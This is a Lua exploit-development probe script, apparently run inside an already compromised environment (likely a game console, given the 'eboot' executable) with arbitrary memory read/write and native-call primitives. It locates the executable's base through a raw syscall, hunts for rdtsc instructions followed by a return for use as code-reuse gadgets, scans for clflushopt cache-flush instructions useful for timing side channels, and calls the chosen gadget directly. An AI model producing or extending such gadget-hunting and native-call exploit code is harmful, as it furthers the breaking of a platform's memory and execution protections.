-- CRASH_CLASS: LOW
-- PROBE 1400c: check known rdtsc offsets for ret within 20 bytes
--
-- v3 found 24 rdtsc (0F 31) in first 2MB, all with no C3 at +2.
-- This checks +2..+20 for each, plus tests native.fcall_with_rax.
-- Also scans for clflushopt (66 0F AE 3x) which v3 missed.

print("=== 1400c ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local eboot_g = nil
local function read_byte(offset)
    local aligned = offset - (offset % 4)
    local d = safe_rd(eboot_g + uint64(aligned))
    if not d then return nil end
    local shift = (offset % 4) * 8
    return math.floor(d / (2 ^ shift)) % 256
end

local function hex_bytes(offset, n)
    local parts = {}
    for i = 0, n - 1 do
        local b = read_byte(offset + i)
        parts[#parts + 1] = b and string.format("%02X", b) or "??"
    end
    return table.concat(parts, " ")
end

-- Get eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
if not text_lo then print("FAIL: no eboot") return end
eboot_g = uint64(string.format("0x%X%08X", text_hi or 0, text_lo))
print("eboot=" .. string.format("0x%X%08X", text_hi or 0, text_lo))

-- Known rdtsc offsets from v3 (first 2MB)
local known = {
    0x17C42, 0x17C98, 0x2AB56, 0x2ABA2, 0x6A109, 0x6E0D2, 0x6E128,
    0x7C352, 0x7C3AC, 0x85562, 0x855BC, 0xCF580, 0xF71B1, 0x11CD16,
    0x120CB1, 0x13E68E, 0x14317D, 0x193606, 0x193652, 0x19B416,
    0x19B462, 0x19BBD0, 0x1CAEE0, 0x1CE0BA
}

-- Verify each is still 0F 31 and check ret within 20 bytes
print("")
print("--- rdtsc ret check (20 bytes) ---")
local best_off = nil
local best_dist = 999
local with_ret = 0

for _, off in ipairs(known) do
    local b0 = read_byte(off)
    local b1 = read_byte(off + 1)
    if b0 == 0x0F and b1 == 0x31 then
        local ret_at = nil
        for j = 2, 20 do
            local b = read_byte(off + j)
            if b == 0xC3 then ret_at = j break end
        end
        if ret_at then
            with_ret = with_ret + 1
            print(string.format("+0x%06X: %s  RET@+%d", off, hex_bytes(off, ret_at + 1), ret_at))
            if ret_at < best_dist then
                best_off = off
                best_dist = ret_at
            end
        else
            -- Show first 24 bytes for manual inspection
            print(string.format("+0x%06X: %s  no-ret-20", off, hex_bytes(off, 24)))
        end
    else
        print(string.format("+0x%06X: NOT rdtsc (got %02X %02X)", off, b0 or 0, b1 or 0))
    end
end

print(string.format("with_ret=%d/%d", with_ret, #known))

-- Also check for CC (int3), FF (call/jmp), and E8 (call near) nearby
-- These might be useful as alternative gadget terminators
print("")
print("--- alternative terminators ---")
for _, off in ipairs(known) do
    local b0 = read_byte(off)
    local b1 = read_byte(off + 1)
    if b0 == 0x0F and b1 == 0x31 then
        for j = 2, 30 do
            local b = read_byte(off + j)
            if b == 0xC3 or b == 0xCB or b == 0xCC then
                print(string.format("+0x%06X: byte %02X at +%d", off, b, j))
                break
            end
        end
    end
end

-- Quick scan: clflushopt (66 0F AE /7 = 66 0F AE 38..3F)
-- Only scan first 2MB, 4 bytes at a time
print("")
print("--- clflushopt scan (first 2MB) ---")
local clflushopt = 0
local prev3, prev2, prev1 = 0, 0, 0
for off = 0, 0x200000 - 4, 4 do
    local d = safe_rd(eboot_g + uint64(off))
    if d then
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        local b3 = math.floor(d / 16777216) % 256

        -- 66 0F AE 3x
        if prev2 == 0x66 and prev1 == 0x0F and b0 == 0xAE and b1 >= 0x38 and b1 <= 0x3F then
            clflushopt = clflushopt + 1
            print(string.format("  +0x%06X: %s", off - 2, hex_bytes(off - 2, 8)))
        end
        if prev1 == 0x66 and b0 == 0x0F and b1 == 0xAE and b2 >= 0x38 and b2 <= 0x3F then
            clflushopt = clflushopt + 1
            print(string.format("  +0x%06X: %s", off - 1, hex_bytes(off - 1, 8)))
        end
        if b0 == 0x66 and b1 == 0x0F and b2 == 0xAE and b3 >= 0x38 and b3 <= 0x3F then
            clflushopt = clflushopt + 1
            print(string.format("  +0x%06X: %s", off, hex_bytes(off, 8)))
        end

        prev3 = prev2
        prev2 = prev1
        prev1 = b3
    end
end
print("clflushopt=" .. clflushopt)

print("")
print("=== BEST RDTSC ===")
if best_off then
    print(string.format("eboot+0x%06X ret@+%d", best_off, best_dist))
    print("bytes: " .. hex_bytes(best_off, best_dist + 1))
else
    print("NONE usable in lower 2MB")
end

-- Test native.fcall_with_rax on best gadget
print("")
print("=== FCALL TEST ===")
if best_off then
    local addr = eboot_g + uint64(best_off)
    if type(native) == "table" and type(native.fcall_with_rax) == "function" then
        print("calling eboot+0x" .. string.format("%06X", best_off))
        local vals = {}
        for i = 1, 6 do
            local ok, v = pcall(function() return native.fcall_with_rax(addr) end)
            if ok and v then
                vals[#vals + 1] = v
            else
                print("fail " .. i .. ": " .. tostring(v))
                break
            end
        end
        if #vals >= 2 then
            print("WORKS: " .. #vals .. " readings")
            for i = 1, #vals do
                local h, l = get_hi_lo(vals[i])
                print(string.format("  [%d] 0x%X%08X", i, h, l))
            end
            for i = 2, #vals do
                local _, l1 = get_hi_lo(vals[i-1])
                local _, l2 = get_hi_lo(vals[i])
                local d = l2 - l1
                if d < 0 then d = d + 0x100000000 end
                print(string.format("  delta[%d]=%d cyc", i, d))
            end
        end
    else
        print("no native.fcall_with_rax")
    end
else
    -- Try a known gadget anyway: eboot+0x17C42 (first rdtsc)
    local addr = eboot_g + uint64(0x17C42)
    print("testing first rdtsc at +0x17C42 (no ret nearby)")
    if type(native) == "table" and type(native.fcall_with_rax) == "function" then
        local ok, v = pcall(function() return native.fcall_with_rax(addr) end)
        if ok then
            local h, l = get_hi_lo(v)
            print("returned: 0x" .. string.format("%X%08X", h, l))
        else
            print("crashed: " .. tostring(v))
        end
    else
        print("no native.fcall_with_rax")
    end
end

print("")
print("=== 1400c DONE ===")
